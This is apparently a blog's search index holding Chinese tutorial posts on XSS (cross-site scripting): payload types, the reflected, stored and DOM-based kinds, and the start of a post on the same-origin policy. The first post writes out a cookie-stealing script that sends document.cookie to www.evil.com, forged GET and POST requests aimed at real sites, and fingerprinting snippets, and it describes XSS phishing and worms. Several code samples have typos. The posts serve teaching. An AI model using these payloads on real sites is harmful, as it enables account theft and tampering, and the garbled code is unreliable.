<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『XSS攻击』XSS攻击进阶：XSS payload</title>
      <link href="/posts/a4a5.html"/>
      <url>/posts/a4a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-XSS-payload"><a href="#什么是-XSS-payload" class="headerlink" title="什么是 XSS payload"></a>什么是 XSS payload</h1><p>当发现网站存在XSS漏洞时，攻击者能够对该网站植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些<strong>用以完成各种具体功能的恶意脚本</strong>，被称为XSS Payload。</p><blockquote><p>XSS Payload实际上就是JavaScript脚本（还可以是 Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到</p></blockquote><h1 id="最常见的XSS-payload——Cookie劫持"><a href="#最常见的XSS-payload——Cookie劫持" class="headerlink" title="最常见的XSS payload——Cookie劫持"></a>最常见的XSS payload——Cookie劫持</h1><ol><li><p><strong>概念</strong></p><p>最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p><blockquote><p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p></blockquote></li><li><p><strong>例子</strong></p><p>如下所示，攻击者可以先构造一个含恶意参数的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载一个远程脚本，真正的XSS Payload写在远程脚本 <code>evil.js</code> 中。</p><blockquote><p>这样可以避免直接在URL的参数里写入大量的JavaScript代码。</p></blockquote><p>在 <code>evil.js</code>  中，可以通过如下代码窃取Cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img -<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.evil.com/log?&quot;</span> + <span class="built_in">escape</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>当用户访问这个构造的url时执行脚本，这段代码在页面中插入了一张看不见的图片，同时把 docnment cookie对象作为参数发送到远程服务器。</p><p>这样就实现了cookie 的劫持</p></li></ol><p>在成功实现XSS攻击后，除了cookie劫持之外，攻击者还有很多更强大的 XSS payload来控制用户的浏览器</p><h1 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h1><ol><li><p><strong>原理</strong></p><p>一个网站的应用，只需要接受HTTP协议中的GET 或 POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p></li><li><p><strong>构造GET请求例子</strong></p><p>假设某博客网站存在XSS漏洞，我们如何通过XSS漏洞来删除掉博客上的某篇文章？</p><p>假设正常删除该文章的链接是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>攻击者可以构造一段javascript代码（XSS Payload）如下，</p><p>这段代码中，通过插入一个img标签来发起一个GET请求，从而对删除文章的链接发出了请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>后续，攻击者只需要通过XSS漏洞诱使用户执行这段XSS Payload，就会删除这篇文章</p></li><li><p><strong>构造POST请求例子</strong></p><p>如果网站上只有一个表单，即仅接收POST请求，如何实施XSS攻击？</p><p>可以通过两种方法实现攻击：</p><ul><li><p><strong>1）构造一个form表单，自动提交这个表单</strong></p><ul><li><p>a. 一个个构造DOM节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;form&quot;</span>);</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;input&quot;</span>);</span><br><span class="line">i1.<span class="property">name</span> = <span class="string">&quot;ck&quot;</span>;</span><br><span class="line">i1.<span class="property">value</span> = <span class="string">&quot;JiUY&quot;</span>;</span><br><span class="line">f.<span class="title function_">appendchi1d</span>(i1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input”);</span></span><br><span class="line"><span class="string">i2.name = &quot;</span> mb_text<span class="string">&quot;;</span></span><br><span class="line"><span class="string">i2.value = &quot;</span>testtesttest<span class="string">&quot;;</span></span><br><span class="line"><span class="string">f.appendchild(i2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f.submit();</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表单的参数很多的话，通过构造DOM 节点的方式，代码将会非常冗长。所以可以使用第二种方法，直接写HTML代码，这样会使得整个代码精简很多。</p></blockquote></li><li><p>b. 直接构造HTML代码，如下所示:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = doeument.<span class="property">createElement</span> (<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendchild</span>(dd);</span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type =<span class="string">&quot;hidden&quot;</span> value = <span class="string">&quot;JiUY&quot;</span> name=<span class="string">&quot;ck&quot;</span>/&gt;<span class="string">&#x27; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;testtesttest&quot;</span> name = <span class="string">&quot;mb_text”/&gt;&#x27; + </span></span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>xssform<span class="string">&quot;).submit();</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2）通过 XMLHttpRequest 发送一个 POST 请求</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.douban.com&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">&quot;ck=JiUY &amp;mb text-test1234&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> ajax =nul1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpReguest</span>)&#123;</span><br><span class="line">    ajax =<span class="keyword">new</span> <span class="title class_">XMLRttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Activexobject</span>)&#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> <span class="title class_">ActiveXobjeet</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.<span class="property">setRequestHeader</span> (<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>(postStr);</span><br><span class="line"></span><br><span class="line">ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readystate</span>- <span class="number">4</span>&amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h1><p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”，当出现需要与用户进行交互的情况是，如：碰到验证码、修改密码时需要输入旧密码，XSS Payload就会失效。</p><p>但我们可以通过其他方法来进行攻击：</p><ul><li>验证码：XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施。攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</li><li>修改密码：攻击者可以将XSS与”钓鱼”结合。如：利用 Javascript 在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li></ul><h1 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h1><p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p><p>如何通过JavaScript脚本识别浏览器版本呢？</p><ol><li><p><strong>通过XSS 读取浏览器的UserAgent对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure><p>但是userAgent是可以伪造的，同时浏览器的一些拓展也可以屏蔽或自定义UA，这个信息不一定准确。</p></li><li><p><strong>根据浏览器之间的差异识别</strong></p><p>根据每种浏览器独有的对象特征识别浏览器的大版本</p></li></ol><h1 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h1><p>知道用户使用的浏览器、操作系统后，可以通过各种方法<strong>识别用户安装了的软件</strong></p><ol><li><p><strong>通过浏览器控件的classid检测相应软件</strong></p><p>可以通过判断软件对应控件的classid是否存在，来判断用户是否安装了该软件</p><p>如下代码检测迅雷的控件 <code>XunLeiBHO.ThunderIEHelper</code> ，如果存在，用户大概率也安装了迅雷软件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;XunLeiBHO.ThunderIEHelper&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">  <span class="comment">//异常了，不存在该控件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本</strong>。</p></li><li><p><strong>通过第三方软件</strong></p><p>如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript</p></li><li><p><strong>其他</strong></p><p>在Chrome中有一个特殊的协议: chrome:&#x2F;&#x2F; ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://flashgot/skin/icon32.png</span><br></pre></td></tr></table></figure><p>扫描Chrome扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p></li></ol><h1 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h1><p>通过CSS，来<strong>发现用户曾经访问过的网站</strong></p><p>如果用户曾经访问过某个链接，那么这个链接的颜色会和未访问过的链接颜色不一致。</p><p>对应的POC代码见《白帽子讲web安全》P58</p><p>搜索引擎好像没有这个情况了，但是google scholar仍然存在，访问过的为紫色</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240229200958088.png" alt="image-20240229200958088"></p><h1 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h1><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢?</p><p>可以通过XSS Payload获取客户端的本地IP地址。</p><p><strong>javascript本身并没有获取本地IP地址的能力。</strong>一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用J ava Applet 的接口获取客户端的本地IP地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AttackAPI</span>.<span class="property">dom</span>.<span class="property">getInternalIP</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> sock = <span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">Socket</span>();</span><br><span class="line">      sock.<span class="title function_">bind</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">0</span>));</span><br><span class="line">      sock.<span class="title function_">connect</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="variable language_">document</span>.<span class="property">domain</span>,(!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>)?<span class="number">80</span>:<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>));</span><br><span class="line">      <span class="keyword">return</span> sock.<span class="title function_">getLocalAddress</span>().<span class="title function_">getHostAddress</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有两个通过API获取本地网络信息的API见《白帽子讲web安全》P61</p><h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><ol><li><p><strong>定义</strong></p><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，破坏力和影响力巨大。XSS蠕虫借助 Ajax技术实现对Web应用程序中存在的 XSS 漏洞进行自动化利用传播，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p></li><li><p><strong>应用场景与条件</strong></p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSSWorm攻击。比如，发送站内信、用户留言等页面，都是xss worm的高发区。</p><blockquote><p>如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p></blockquote></li><li><p><strong>例子</strong></p><ul><li><p><strong>第一个重量级的XSS worm —— Samy worm</strong></p><p>通过在标签的style属性上构造XSS蠕虫</p><p>解析：<a href="https://www.cnblogs.com/milantgh/p/3655070.html">https://www.cnblogs.com/milantgh/p/3655070.html</a></p></li><li><p>百度空间蠕虫</p><p>在CSS代码后插入js代码</p><p>解析：<a href="https://blog.csdn.net/qq_33605106/article/details/79756478">https://blog.csdn.net/qq_33605106/article/details/79756478</a></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『XSS攻击』XSS简介</title>
      <link href="/posts/13a2.html"/>
      <url>/posts/13a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><p>XSS全称是Cross Site Scripting，中文为<strong>跨站脚本攻击</strong>，为了和CSS（层叠样式表（<code>Cascading Style Sheets，CSS</code>））区分命名为XSS。</p><p>XSS的原理：在HTML页面中注入恶意脚本，当目标网站目标用户的浏览器渲染HTML文档时，恶意脚本执行，使得黑客可以控制用户浏览器。</p><p>一个简单的例子：</p><p>有一个网页，会将用户输入的内容回显在页面上。</p><p>如果我们在该网页输入如下脚本，脚本的作用就是弹出一个对话框显示用户的Cookie信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果目标服务器没有对这个输入进行检验就直接将其显示在页面上的话，则会生成如下形式的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这段脚本已经成功嵌入到该页面当中。</p><p>当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而<strong>被执行</strong>，即弹出对话框显示受害浏览器的Cookie信息。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>根据效果的不同，XSS攻击主要可以分为以下几类：</p><h2 id="反射型XSS（非持久型XSS）"><a href="#反射型XSS（非持久型XSS）" class="headerlink" title="反射型XSS（非持久型XSS）"></a>反射型XSS（非持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>一般情况下，黑客发送给别人发送<strong>带有恶意脚本代码参数的 <code>url</code></strong> ，当用户打开这个带有恶意代码参数的 <code>url</code> 地址时，恶意脚本代码作为输入提交到服务器端，服务器端解析后响应，恶意代码被目标服务器通过<strong>错误信息、搜索结果等等方式“反射”</strong>回显在用户的浏览器上，浏览器解析执行XSS代码。</p><blockquote><p>场景：一般会出现在查询类页面等。</p><p>这种网站一般会显示用户的输入，用户点开会恶意代码参数就会显示在网站上并执行。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>非持久性。攻击脚本不会写入网站的数据库，是一次性的攻击。所以黑客一般需要诱骗用户点击包含攻击脚本的 URL，才能攻击成功。</li><li>需要传递给服务器，通过服务器反射恶意脚本</li></ul></li><li><p><strong>例子</strong></p><p>假设网站有一个搜索功能，该功能接收URL参数中用户提供的搜索词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift</span><br></pre></td></tr></table></figure><p>网站在对这个URL的响应中，回显用户提供的搜索词</p><p>假设应用程序不对数据进行任何其他处理，攻击者就可以构造如下的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他用户访问这个url的时候，对应渲染出来的html应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户的浏览器就会执行script内部的恶意代码</p></li></ol><h2 id="存储型XSS（持久型XSS）"><a href="#存储型XSS（持久型XSS）" class="headerlink" title="存储型XSS（持久型XSS）"></a>存储型XSS（持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>黑客利用XSS 漏洞，将内容经正常功能提交进入目标服务器端的数据库中并持久保存。当正常用户请求目标页面时，前端页面获得后端从数据库中读出的注入代码，恰好将其渲染执行。</p><blockquote><p>场景：一般存在于 Form 表单提交等交互功能，如发帖留言，注册页面等。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>稳定性：恶意脚本存入网站服务器端</li></ul></li><li><p><strong>例子</strong></p><p>黑客写下一篇包含有恶意JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</p></li></ol><h2 id="DOM-based型XSS"><a href="#DOM-based型XSS" class="headerlink" title="DOM-based型XSS"></a>DOM-based型XSS</h2><ol><li><p><strong>原理</strong></p><p>从效果来看，DOM-based型XSS也属于反射型，但是其形成的原因比较特殊，所以单独拿出来介绍。</p><p><strong>通过DOM操作前端代码输出</strong>的时候形成的XSS为DOM-based型XSS</p><p>客户端的脚本<strong>通过DOM动态地输出数据到页面</strong>而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行。</p><blockquote><p>场景：一般产生于用户能够进行参数输入查询的地方</p><p><strong>网站本地执行url中的参数而并不传给服务器</strong></p></blockquote></li><li><p><strong>特点</strong></p><ul><li>不与后台服务器产生数据交互</li><li>无法从服务器端进行防御。因为构造的url中的恶意代码参数并不传给服务器，而是客户端获得DOM中的数据直接在本地执行，服务器无法检测到。</li><li>通过客户端脚本在浏览器端触发</li></ul></li><li><p><strong>例子</strong></p><p>有一个网站，包含一个搜索框，用户输入关键字并点击搜索按钮，搜索结果会显示在页面上。网站使用JavaScript来获取URL中的搜索词并将其显示在页面上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1637811827_619f06737e8996f4cbccd.png" alt="img"></p><p>可以看到网站直接通过document.write从url中提取参数并将参数打印在网页上，而并没有将参数传给服务器</p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户访问该url时直接本地执行xss代码</p></li></ol><h1 id="XSS攻击学习平台"><a href="#XSS攻击学习平台" class="headerlink" title="XSS攻击学习平台"></a>XSS攻击学习平台</h1><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『浏览器安全』浏览器同源策略与沙箱</title>
      <link href="/posts/77ff.html"/>
      <url>/posts/77ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="同源策略的定义"><a href="#同源策略的定义" class="headerlink" title="同源策略的定义"></a>同源策略的定义</h2><p>我们的浏览器出于安全考虑，只允许与<strong>本域</strong>下的接口交互。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><h2 id="同源策略的应用"><a href="#同源策略的应用" class="headerlink" title="同源策略的应用"></a>同源策略的应用</h2><p>如果没有同源策略，别人就可以轻松的获取我们网站的 cookie 信息， 或是对网页进行DOM操作，可能会造成数据被盗取等后果。</p><p>例如，它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，从第三方网络邮件服务（用户已登录）或公司内网（因没有公共 IP 地址而受到保护，不会被攻击者直接访问）读取数据，并将这些数据转发给攻击者</p><h2 id="本域与跨域"><a href="#本域与跨域" class="headerlink" title="本域与跨域"></a>本域与跨域</h2><p>在<strong>同一个协议、主机、端口</strong>下的页面属于同一个域（即本域），否则就是跨域。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240125204517169.png" alt="image-20240125204517169"></p><blockquote><p>同主机：表示的是主机名相同，而并不是域名。比如上面的例子，第一个例子的主机名为 <code>store.company.com</code> ，最后一个例子的主机名为 <code>news.company.com</code> ，两个例子的主机名不相同，但是域名均为 <code>company.com</code> ，不同源</p></blockquote><p>如果是以下两个链接进行数据交互，可以通过同源策略的检测，允许交互：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.angular.cn:80/guide/inputs-outputs</span><br><span class="line">https://www.angular.cn:80/guide/index</span><br></pre></td></tr></table></figure><p>而如果是以下这样的链接交互数据，则不能通过同源策略的检测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure><p>所以就会牵引出一个问题，<strong>不同源的数据如何进行交互？</strong></p><h2 id="跨域数据交互问题"><a href="#跨域数据交互问题" class="headerlink" title="跨域数据交互问题"></a>跨域数据交互问题</h2><p>如何跨域加载资源？</p><ol><li><p><strong>一些特殊的标签</strong></p><p><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签可以跨域加载资源</p><p>如：可以通过下面的代码访问其他域下的脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 